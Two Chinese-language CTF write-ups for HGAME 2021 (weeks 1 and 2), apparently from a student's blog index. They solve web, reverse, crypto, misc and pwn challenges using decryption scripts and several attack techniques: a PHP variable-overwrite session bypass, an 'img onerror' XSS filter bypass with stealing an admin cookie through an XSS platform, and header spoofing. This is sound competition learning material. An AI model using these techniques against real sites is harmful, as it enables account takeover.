首先打开题目地址 ​ 根据题目给的hint，在地址栏后面加上 /www.zip 获得网页源码 ​ 接着打开 lazy.php 和 flag.php 这两个php文件，再根据变量覆盖的提示找到漏洞点 ​ 这里划线处的两个$符号容易导致变量覆盖，那么根据 flag.php 中得到flag的条件就可以进行构造，相当于： $_SESSSION[username]=admin ​ 双写SESSION是因为上面str_replace的过滤 ​ 得到flag 2.Post to zuckonit ​ ​ 点开后发现是留言板，题目也很明确的指出是xss，那么就先尝试输入 script，iframe，image ​ 输入后发现不管大小写 script 都会被过滤掉，小写的 iframe 会被过滤，image则不会被过滤 ​ 之后尝试输入 img src=1 onerror = alert(1) ，让错误的图片导致弹窗 ​ 输出了这么个东西，把这个输入再 post 就会弹窗，成功弹窗之后就是找一个 xss 平台来接受 cookie 信息 ​ 根据之前的规律 post 平台给的语句，并用脚本得出 md5 验证码提交，接收到 cookie 信息 脚本： 12345678910import hashlibdef md5(s): return hashlib.md5(s.encode()).hexdigest()def get_code(): code = 'XXXXXX' for i in range(10000000, 99999999): #8位md5 if md5(str(i)).startswith(code): return str(i)print(get_code()) ​ 接着就伪造 admin cookie 得到flag Re 1.ezApk ​ 安卓逆向，用 jadx 反编译为 java，找到 onClick 事件 ​ 这条判断语句是关键，在资源文件中找到加密后的 flag 和 key ​ s函数用来加密输入的字符串，转到s函数分析 ​ 仔细分析后得知是AES CBC模式加密，密钥是之前的key经过sha-256加密得到的，iv向量则是key经过MD5加密得到的，最后将加密结果再进行一次 base64 加密得到之前的 flag ​ 尝试用在线网站解密，但是网站一般只支持 16 位 iv 值解密，没有别的办法只能东拼西凑写出 java 脚本来解密 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package com.company;import javax.crypto.Cipher;import javax.crypto.spec.IvParameterSpec;import javax.crypto.spec.SecretKeySpec;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;import java.util.Base64;public class Main { //md5,sha-256加密 public static byte[] t(String str, String str2) { MessageDigest instance = null; try { instance = MessageDigest.getInstance(str); } catch (NoSuchAlgorithmException e) { e.printStackTrace(); } byte[] bytes = str2.getBytes(); byte[] digest = instance.digest(bytes); return digest; } //解密 public static String desEncrypt(String data, byte[] key) { byte[] ivString = t(&quot;MD5&quot;,&quot;A_HIDDEN_KEY&quot;); //iv向量 byte[] iv = ivString; try { byte[] encryp = Base64.getDecoder().decode(data); Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS7Padding&quot;); SecretKeySpec keySpec = new SecretKeySpec(key, &quot;AES&quot;); IvParameterSpec ivSpec = new IvParameterSpec(iv); cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec); byte[] original = cipher.doFinal(encryp); return new String(original); } catch (Exception e) { e.printStackTrace(); } return null; } public static void main(String[] args) { String data = &quot;EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY&quot;; //密文 byte[] key =t(&quot;SHA-256&quot;,&quot;A_HIDDEN_KEY&quot;); //密钥 String desencrypt = desEncrypt(data, key); System.out.println(&quot;解密后:&quot;+desencrypt); }} ​ 因为要用到的是AES 256位解密，而 java 本身只支持 128位 AES 解密，所以就要做其他的一些配置才能解密 2.helloRe2 ​ 拖进 IDA 分析，乍一看结构有点复杂，password1 的判断在后半部分，而password2 的判断在前半部分，先分析 password1 ​ 关键部分是这条判断，判断输入的password长度和 password 经过一系列操作后的结果，用 ollydbg 调试并不断猜测，得知这么一系列操作就是判断输入的字符串是否是给出的密文的逆序 ​ 之后再分析 pwd2 ​ 应该又是AES CBC 模式加密，找到 iv 和 密钥，密钥是pwd1经过异或得到，密文是已经给出密文的逆序 ![](D:\\HGAME2021\\HGAME week2\\re2(4).png) ​ 解密就用上一题的脚本 ​ 这里看着像是两次加密，但其实只有一次 3.fake_debugger beta ​ nc题目地址，发现只有在 ebx 经过一次转换后与 eax 相等才能继续调试，之后不断调试发现 ​ 转换前的 ebx 与 eax 异或后就是 flag 中的字符，那就一个个调试下来得到 flag Crypto 1.gcd or more? ​ ​ 看着像是RSA，但是e = 2。百度后查到低指数爆破，之后又看到Rabin算法，特征是e = 2 ，那么就用这个脚本解题 12345678910111213141516171819202122import gmpy2import libnume = 2p = 85228565021128901853314934583129083441989045225022541298550570449389839609019q = 111614714641364911312915294479850549131835378046002423977989457843071188836271n = p * qc = 7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539#c= int(open('./flag.enc','rb').read().encode('hex'),16)mp = pow(c, (p + 1) // 4, p)mq = pow(c, (q + 1) // 4, q)yp = gmpy2.invert(p, q)yq = gmpy2.invert(q, p)r = (yp * p * mq + yq * q * mp) % nrr = n - rs = (yp * p * mq - yq * q * mp) % nss = n - sprint(libnum.n2s(int(r)))print(libnum.n2s(int(rr)))print(libnum.n2s(int(s)))print(libnum.n2s(int(ss))) 2.WhitegiveRSA ​ ​ 已知N，那就拿到在线网站里分解出大素数 q 和 p，剩下来都已知就用脚本解密 Misc 1.Tools ​ 下载解压得到一个压缩包和一张图片，根据题目的 tools 和压缩包名 f5 尝试用 f5 工具破解压缩包密码，破解所需的密码在图片的详细信息中 ​ 打开加密压缩包后发现一部分二维码和压缩包，接着就是像之前那样找到压缩包名里的工具解密，最终集齐4张二维码碎片，用win10自带的画图工具拼合，扫码得flag 2.Telegraph：1601 6639 3459 3134 0892 ​ 题目为音频隐写，又提到听着反胃，于是猜测是摩斯电码。听了之后，中间有一段嘀嗒声，这一段就是需要摩斯解密的部分，接着把音频拖到 Audacity 里面分析 ​ 首先看一下频谱图 ​ 得到850hz的提示，之后尝试翻译摩斯电码，发现中间有一段无法辨认就想到要滤波，用的是上面的提示 ​ 窄的是**.** 宽的是**-** ，翻译后解密就得到flag 3.Hallucigenia ​ 只给了一张图，那么就先用 Stegsolve 左右调一下得到二维码 ​ 扫码得到一串 base64 解码发现最后是 GNP ，根据题目中 **“我们不仅弄错了他的上下，还颠倒了它的左右。” **逆序处理后粘贴到winhex保存为图片 ​ 发现又是上下左右颠倒，倒回来就得flag 4.DNS ​ 流量包分析，筛选 dns 得到一串域名并访问 ​ 抓包得 ​ 查一下 SPF 知道是一种 dns 记录，那就用在线网站查一下dns记录，得到flag 总结： ​ 这周比较摸鱼，web 能做出两道是因为给了具体的考点，参照往年 writeup 一点点做下来。 re 做了很久，因为之前没有接触过 apk 逆向，对 aes 加密也不太了解，最后能全部做出来真是太好了，逆向的时候果然是要抓重点，解完题后才发现其实挺简单的。 密码学是真不太行，这周 pwn 也基本没看，Misc 倒是做的挺顺畅的，下周要试着把之前的知识捡起来了","link":"/2021/03/27/HGAME-Week2-Writeup/"},{"title":"HGAME-Week1-writeup","text":"Week1 1.web 1.Hitchhiking_in_the_Galaxy ​ 网页f12发现 /HitchhikerGuide.php , 抓包发现 302, 于是在 Linux 中用 curl 命令访问这里,发现 405 那么就改用 post 请求方式 ​ 刚开始看到这句话后没有一点想法,就去看了看发的学习资料,看到 user-agent 后意识到应该是要加这个头 (因为引擎) , 内容是那串英文 ​ 仅能通过本地访问 , 那么就再加一个 x-forwarded-for 头 , 最后说要从茄子学长的网站过来 , 再加一个 referer 头,得到 flag 2.watermelon ​ 打开网页发现是合成大西瓜, 玩了一遍发现要达到2000分才能得到flag, 于是毫不犹豫地抓包(可惜接受不到分数,是为什么我也不清楚) 抓包不行那么就只能修改 js 代码,然而在我试图修改的过程中发现 ​ 把网页变成这样就能轻松玩到2000分! (到底怎么改js代码我不太清楚,应该是要找到存储分数的变量,然后在 console 里修改…) ​ 得到 flag 3.宝藏走私者 ​ 先拿着学习资料学习了一下,之后点开网页点击 secret data 跳转到另一个界面,提示要是 localhost ,于是加了 host 头 ​ 意外的就得到了 flag (不知道怎么得到的, 好像跟学习资料无关?) 4.智商检测鸡 ​ 用 firefox 浏览器打开网页发现要做100道定积分才能得到 flag, f12看到网页源代码,里面有个 getflag() 函数 ​ 在 console 输入后,弹出一句话(是啥我忘了) , 得知这样不行,于是我就搭配定积分计算器解完了这100题,得到 flag (之后看r4u学长发的学习资料,觉得应该是 python 爬虫一类的,可惜我 python 还不太会,只能手动解题了) web 总结: web 开始的时候是真的一点都不会, watermelon 和定积分都不是通过 web 知识解的, burp 也是前几天刚装的(安装花了一天…),总之学到了很多 2.reverse 1.apacha ​ 应该是这周 re里最难的（但其实也不是太难），首先用 ida 打开文件并初步分析 ​ 关键部分在第25和第26行的两个函数 ​ 第一个关键函数，刚开始看觉得挺复杂的后来发现了 tea 型加密算法的特征，查资料猜测这应该是 xxtea 加密算法 ​ 第二个关键函数，判断输入是否为 flag 。加密后的 flag存在unk_501C , 每四个字节一组 ​ 之后就是写脚本解密，于是在网上找了一个现成的脚本（ c语言），改了一下就得到 flag（这里有个地方需要注意，因为是小端序所以 ida 中加密的数据每四个字节要逆序才是真正的加密数据） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define tea_DELTA 0x9e3779b9#define xxtea_MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))void xxtea(uint32_t* origin, int n, uint32_t const key[4]);int main(){ unsigned int data[] = { 0xE74EB323,0xB7A72836,0x59CA6FE2,0x967CC5C1,0xE7802674 ,0x3D2D54E6,0x8A9D0356,0x99DCC39C,0x7026D8ED,0x6A33FDAD, 0xF496550A,0x5C9C6F9E,0x1BE5D04C,0x6723AE17,0x5270A5C2, 0xAC42130A,0x84BE67B2,0x705CC779,0x5C513D98,0xFB36DA2D, 0x22179645,0x5CE3529D,0xD189E1FB,0xE85BD489,0x73C8D11F,0x54B5C196, 0xB67CB490,0x2117E4CA,0x9DE3F994,0x2F5AA1AA,0xA7E801FD,0xC30D6EAB, 0x1BADDC9C,0x3453B04A,0x92A406F9 }; int i, j;uint32_t* encode = (uint32_t*)data; uint32_t const key[4] = {1,2,3,4}; xxtea(encode, -35, key); for (i = 0; i &lt; 35; i++) printf(&quot;%d,&quot;, data[i]);}void xxtea(uint32_t* origin, int n, uint32_t const key[4]){ uint32_t y, z, sum; unsigned p, rounds, e; if (n &gt; 1) /* Coding Part */ { rounds = 6 + 52 / n; sum = 0; z = origin[n - 1]; do { sum += tea_DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p = 0; p &lt; n - 1; p++) { y = origin[p + 1]; z = origin[p] += xxtea_MX; } y = origin[0]; z = origin[n - 1] += xxtea_MX; } while (--rounds); } else if (n &lt; -1) /* Decoding Part */ { n = -n; rounds = 6 + 52 / n; sum = rounds * tea_DELTA; y = origin[0]; do { e = (sum &gt;&gt; 2) &amp; 3; for (p = n - 1; p &gt; 0; p--) { z = origin[p - 1]; y = origin[p] -= xxtea_MX; } z = origin[n - 1]; y = origin[0] -= xxtea_MX; sum -= tea_DELTA; } while (--rounds); }} 2.helloRe ​ 这题不难，只是有点 c++ 的语法，同样 ida ​ 关键在中间的异或操作，写个脚本就能得到结果 3.pypy ​ 这题考的是 python 字节码，刚开始看的时候还不太懂python语法花了点时间去理解，通过 dis 文档来分析每一条语句，大概还原了一下 ​ 理解之后就是用脚本解题，再加上 hgame{} （刚开始交的时候忘加了） 3.pwn 1.whitegive ​ 下载，在 Linux 中用 gdb 调试，得知输入数字在栈中的的存储位置为 0x7ffffffffde50 ​ 继续调试，发现最后 if 语句比较的是 rax 和 rdx 的值，而此时 rax 存储的是 ‘paSsw0rd’ 字符串的地址，那么只要输入这个地址的十进制值就能使条件成立 ​ nc连接，cat flag（的确挺白给的，毕竟我都能做） pwn 总结：我也太菜了只解出白给题 ,看了最后一题但不太会 rop , 总之这周就稍微学习了一下怎么写 pwn 的脚本和一些基础知识以及安装工具 4.crypto 2.对称之美 ​ 打开链接下载 python 文件 ​ key 是在 ascii 字母和数字里随机选取16个组成，而 cipher 是由明文与循环的 key 异或得到的密文 ​ 根据异或特性知道密文与循环的 key 异或就是明文，那么这道题重点就是求出一组 key 。多次下载附件发现 cipher 各不同，那就利用多个密文写脚本爆破得到前16位明文 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849table = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;de0 = []c = []for i in range(0,130): c.append(0)flag = []#for i in range(0, 16):for j in range(0, 62): de0.append(xor(cipher0[15], table[j])) de0.append(xor(cipher1[15], table[j])) de0.append(xor(cipher2[15], table[j])) de0.append(xor(cipher3[15], table[j])) de0.append(xor(cipher4[15], table[j])) de0.append(xor(cipher5[15], table[j])) de0.append(xor(cipher6[15], table[j])) de0.append(xor(cipher7[15], table[j])) de0.append(xor(cipher8[15], table[j])) de0.append(xor(cipher9[15], table[j])) de0.append(xor(cipher10[15], table[j])) de0.append(xor(cipher11[15], table[j])) de0.append(xor(cipher12[15], table[j])) de0.append(xor(cipher13[15], table[j])) de0.append(xor(cipher14[15], table[j])) de0.append(xor(cipher15[15], table[j])) de0.append(xor(cipher16[15], table[j])) de0.append(xor(cipher17[15], table[j])) de0.append(xor(cipher18[15], table[j])) de0.append(xor(cipher19[15], table[j])) de0.append(xor(cipher20[15], table[j])) de0.append(xor(cipher21[15], table[j])) de0.append(xor(cipher22[15], table[j])) de0.append(xor(cipher23[15], table[j])) de0.append(xor(cipher24[15], table[j])) de0.append(xor(cipher25[15], table[j])) de0.append(xor(cipher26[15], table[j])) de0.append(xor(cipher27[15], table[j])) de0.append(xor(cipher28[15], table[j])) de0.append(xor(cipher29[15], table[j])) de0.append(xor(cipher30[15], table[j])) de0.append(xor(cipher31[15], table[j])) de0.append(xor(cipher32[15], table[j])) de0.append(xor(cipher33[15], table[j]))for j in de0: c[j] = c[j] + 1for j in range(0, 128): if c[j] == 34: print(j) ​ 知道前16位明文，那就可以求得一组 key ，并得到 flag，过程同样是写脚本 ​ Get flag! 3.Transformer ​ 下载，发现其中一个文件中有flag形式的字符串，还有两个文件分别存储明文和密文，虽然顺序是打乱了的 ​ 接下来就采用传统的人工查找明文和密文一一对应的方式得到flag ​ 当然那个 txt 文件最后解密还提示 flag 后面要加上年份2021才正确 （搜了一下题目发现是人工智能模型，我只有人工没有智能…） crypto 总结：没想到最后竟是第一题没解出来，本来以为第二题解不出来反而解出来了。这周稍微学了点怎样写解密脚本，收获挺大 5.misc 1.Base全家福 ​ 题目中提到 base家族，查资料得知有不只有 base64 ，再根据不同 base 加密字符的特征多次解密 ​ 如图所示，得到 flag 2.不起眼压缩包的养成的方法 ​ 打开得到图片，题目中提到了压缩包，猜测能从图片中得到压缩包，于是在 linux 中用 binwalk 检测发现了压缩包，并用 foremost 命令分离出来 ​ 分离解压后得到 ​ 发现得到里面的文件需要密码，那就用百度识图来获取之前得到的图片的p站id解密。之后点进plain.zip发现又需要密码，并且发现plain.zip里有flag.zip和相同的NO PASSWORD.txt文件，猜测是利用明文攻击解密，用相同的方式压缩已得到的NO PASSWORD.txt。 ​ 根据提示storage，用仅存储的方式压缩（刚开始不知道storage是存储等级所以卡了一会儿，问了学长后才知道） 再用ARCHPR进行破解，得到口令和密钥，最后得到flag.zip的内容。16进制转字符串，得flag 3.Galaxy ​ 打开连接下载，得到以**.pcapng**为后缀的文件，之后用 wireshark 打开 ​ 如图所示，导出 http 流 ​ 找到了遗失的 galaxy 图片，在 windows 下能正常打开，但之后把图片放到 linux 中，想用 binwalk 分析的时候发现在 Linux 下无法打开图片。 ​ 上网查资料得知图片的高和宽可能被修改，与原来 crc 值不匹配才报错。于是在网上找了个脚本，得到正确的高宽 ![](HGAME-Week1-writeup/misc3 (2).png) ​ 然后就用 winhex 修改高和宽并保存 ​ 得到 flag！ 4.Word RE:MASTER ​ 下载得两个文档，发现其中一个文档加密了，那就先打开另一个文档 ​ 在 first.docx 文档中发现了 brain 和 fuck 两个单词，猜测有brainfuck 加密，但是之后因为不知道密文卡了很久，尝试用 winhex 打开另一个文档得到 ​ 我以为这就是密文了，于是就开心的拿去解密网站解密（当然这是错的） ​ 问了Akira 学长后发现这密文缺少了前半部分，只能转用别的方法。首先尝试把第一个文档的后缀改为 zip ，打开后竟发现 ​ ​ 丢到网站解密后得到 DOYOUKNOWHIDDEN? ，用这个打开第二个文档 ​ 因为这个文档密码是 DOYOUKNOWHIDDEN? ，所以立马显示 word 的隐藏字符，得到 ​ 一堆空白字符，由空格和制表符组成，这里我用箭头和点表示 ​ 这之后就卡了很久（大概一天多…），我甚至尝试用二进制01表示，实在想不出来了于是去问学长，提示我搜一下第二个文档图片中出现最多的字的英文（之前一直盯着图片内容看，以为hint是音游梗，果然是我想太多orz） ​ 接着就搜索snow，知道了空白字符的隐写，上工具解密 misc总结：拿到题目后完全没思路，所以在这一周中查了很多资料，觉得自己就是个菜鸡，好在最后全部解了出来，也学到了很多东西","link":"/2021/03/26/HGAME-Week1-writeup/"}],"tags":[{"name":"wp","slug":"wp","link":"/tags/wp/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"hgame","slug":"hgame","link":"/tags/hgame/"},{"name":"cve复现","slug":"cve复现","link":"/tags/cve%E5%A4%8D%E7%8E%B0/"},{"name":"buu","slug":"buu","link":"/tags/buu/"},{"name":"upx","slug":"upx","link":"/tags/upx/"},{"name":"MFC","slug":"MFC","link":"/tags/MFC/"},{"name":"android","slug":"android","link":"/tags/android/"},{"name":"riscv","slug":"riscv","link":"/tags/riscv/"},{"name":"gdb","slug":"gdb","link":"/tags/gdb/"},{"name":"qemu","slug":"qemu","link":"/tags/qemu/"},{"name":"re","slug":"re","link":"/tags/re/"},{"name":"windows","slug":"windows","link":"/tags/windows/"}],"categories":[{"name":"Hgame2021","slug":"Hgame2021","link":"/categories/Hgame2021/"}]}